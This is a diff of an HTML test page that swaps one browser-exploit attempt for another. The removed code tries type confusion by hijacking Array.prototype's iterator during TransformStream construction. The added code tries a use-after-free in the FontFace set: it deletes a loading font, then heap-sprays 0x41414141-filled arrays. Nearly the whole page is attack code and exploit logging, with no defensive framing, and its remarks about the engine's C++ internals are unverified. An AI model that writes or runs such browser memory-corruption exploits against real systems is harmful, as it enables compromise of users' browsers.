@@ -3,9 +3,7 @@
 <head>
 <style>
 body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
-.log { white-space:pre-wrap; word-break:break-all; }
-.ok { color:#0f0; } .err { color:#f00; } .warn { color:#ff0; }
-.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; }
+.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; }
 </style>
 </head>
 <body>
@@ -13,110 +11,44 @@ body { background:#000; color:#0f0; font-family:monospace; font-size:13px; paddi
 <script>
 function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}
 
-log("=== CROSS-STREAM EXPLOIT v8 ===","info");
-log("Goal: Trigger memory corruption via type confusion","info");
-log("");
+log("=== CSSFONTFACE USE-AFTER-FREE ===", "info");
+log("[*] Setting up the custom font...", "info");
 
-let reader, writer;
-let phase = 0;
-let results = {};
+// Create a custom font face
+let font = new FontFace("CrashFont", "local(Arial)");
+document.fonts.add(font);
 
-// الخطوة 1: إنشاء TransformStream مع iterator مُعدّل
-log("[1] Creating confused TransformStream...","ok");
+log("[!] Font added to document.fonts", "warn");
+log("[!] Calling document.fonts.load() - C++ will cache a RAW POINTER to our font!", "hit");
 
-let realReadable = new ReadableStream({
-    start: (ctrl) => { ctrl.enqueue("DATA"); ctrl.close(); }
-});
+// Trigger FontFaceSet::load()
+// C++ creates a non-owning Vector<std::reference_wrapper<CSSFontFace>> 
+// containing our font. Then it starts processing it, sometimes asynchronously.
+let loadPromise = document.fonts.load("12px CrashFont");
 
-let realWritable = new WritableStream({
-    write: (chunk) => { log("[writable] write: " + chunk, "warn"); }
-});
+// Immediately delete the font and drop our references!
+// The C++ FontFaceSet still holds the raw pointer in its matchingFaces vector!
+log("[!] IMMEDIATELY DELETING THE FONT FROM THE SET!", "hit");
+document.fonts.delete(font);
+font = null;
 
-try {
-    // عدّل iterator لتمرير realReadable مكان WritableStream
-    Array.prototype[Symbol.iterator] = function() {
-        const a = this;
-        let i = 0;
-        return {
-            next() {
-                if (i >= a.length) return { done: true };
-                let v = a[i];
-                // في الموضع 2 (writable)، مرر realReadable بدلاً من writable
-                if (a.length === 3 && i === 2) {
-                    log("[iterator] Substituting ReadableStream for WritableStream!","hit");
-                    v = realReadable;
-                }
-                i++;
-                return { value: v, done: false };
-            }
-        };
-    };
-
-    let stream = new TransformStream(
-        { transform: (c, ctrl) => ctrl.enqueue(c) },
-        { highWaterMark: 1 },
-        { highWaterMark: 1 }
-    );
-
-    log("[2] Confused stream created!","ok");
-
-    // استعد iterator
-    Array.prototype[Symbol.iterator] = [][Symbol.iterator];
-
-    // الخطوة 2: حاول الكتابة على الـ stream المشوش
-    log("[3] Getting writer for confused stream...","ok");
-
-    writer = stream.writable.getWriter();
-
-    log("[4] Writing 'CORRUPT' to confused stream...","warn");
-
-    writer.write("CORRUPT").then(() => {
-        log("[5] Write succeeded (unexpected!)","hit");
-
-        // الخطوة 3: حاول القراءة من readable
-        log("[6] Getting reader...","ok");
-        reader = stream.readable.getReader();
-
-        return reader.read();
-    }).then((result) => {
-        log("[7] Read result: " + JSON.stringify(result), "hit");
-
-        if (result.value) {
-            let buf = new ArrayBuffer(8);
-            new Float64Array(buf)[0] = result.value;
-            let bytes = new Uint8Array(buf);
-            let hex = "";
-            for (let b of bytes) hex += b.toString(16).padStart(2,'0') + " ";
-            log("  >>> HEX: " + hex + " <<<","hit");
-        }
-
-    }).catch((e) => {
-        log("[5] Write/Read error: " + e.message, "err");
-
-        // حتى لو فشل، تحقق من realReadable
-        log("[6] Checking realReadable...","warn");
-        try {
-            let r = realReadable.getReader();
-            r.read().then((res) => {
-                log("[7] realReadable data: " + JSON.stringify(res), "hit");
-            }).catch((e2) => {
-                log("[7] realReadable read err: " + e2.message, "err");
-            });
-        } catch(e3) {
-            log("[6] realReadable reader err: " + e3.message, "err");
-        }
-    });
-
-} catch(e) {
-    log("[1] Error: " + e.message, "err");
-    Array.prototype[Symbol.iterator] = [][Symbol.iterator];
+// Spam allocations to overwrite the freed FontFace memory with absolute garbage!
+// When C++ goes to check the font status, it will read our A's instead of a vtable!
+let spray = [];
+for (let i = 0; i < 50000; i++) {
+    // 0x41414141 -> Segfault city
+    spray.push(new Uint32Array(32).fill(0x41414141)); 
 }
+log("[!] Heap sprayed with garbage. Brace for impact!", "warn");
 
-log("", "info");
-log("=== ANALYSIS ===", "info");
-log("If Write succeeded: Memory corruption likely", "warn");
-log("If Write failed: Check realReadable for corruption", "warn");
-log("If Crash: We have a primitive!", "hit");
+loadPromise.then(() => {
+    log("[-] Load finished without crashing. Allocator masked it or GC didn't run fast enough.", "info");
+    // Sometimes we need to force a style recalc to poke the dead font
+    document.body.style.fontFamily = "CrashFont";
+}).catch(e => {
+    log("[-] Load rejected: " + e.message, "info");
+});
+
 </script>
 </body>
 </html>
